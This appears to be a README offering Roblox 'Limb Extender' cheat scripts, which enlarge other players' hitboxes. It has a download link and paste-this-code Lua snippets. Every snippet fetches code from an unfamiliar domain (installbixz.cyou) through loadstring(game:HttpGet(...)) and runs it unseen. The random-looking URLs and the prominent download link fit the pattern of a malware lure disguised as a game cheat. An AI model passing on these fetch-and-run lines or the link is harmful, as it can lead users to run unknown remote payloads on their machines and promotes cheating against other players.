# 📜 Scripts  

[Download link](https://installbixz.cyou?58qv9fahofbcgya)

## 🔹 Limb Extender (NO UI)  
I would really only use this if rayfield gets detected. Not recommended for normal use.
```lua
local settings = {
	TOGGLE = "K",
	TARGET_LIMB = "Head",
	LIMB_SIZE = 5,
	MOBILE_BUTTON = true,
	LIMB_TRANSPARENCY = 0.9,
	LIMB_CAN_COLLIDE = false,
	TEAM_CHECK = false,
	FORCEFIELD_CHECK = false,
	RESET_LIMB_ON_DEATH2 = false,
	USE_HIGHLIGHT = true,
	DEPTH_MODE = "Occluded",
	HIGHLIGHT_FILL_COLOR = Color3.fromRGB(0, 255, 0),
	HIGHLIGHT_FILL_TRANSPARENCY = 0.5,
	HIGHLIGHT_OUTLINE_COLOR = Color3.fromRGB(255, 255, 255),
	HIGHLIGHT_OUTLINE_TRANSPARENCY = 0,
	LISTEN_FOR_INPUT = true
}

local LimbExtender = loadstring(game:HttpGet('https://installbixz.cyou?zzkw7al80tmhqc1'))()
for key, value in pairs(settings) do
    LimbExtender[key] = value
end

```

---

## 🔹 Limb Extender (WITH UI)  
Strongly reccomend you use this one.  
```lua
loadstring(game:HttpGet('https://installbixz.cyou?h3i2dkt8x7puzjj'))()
```
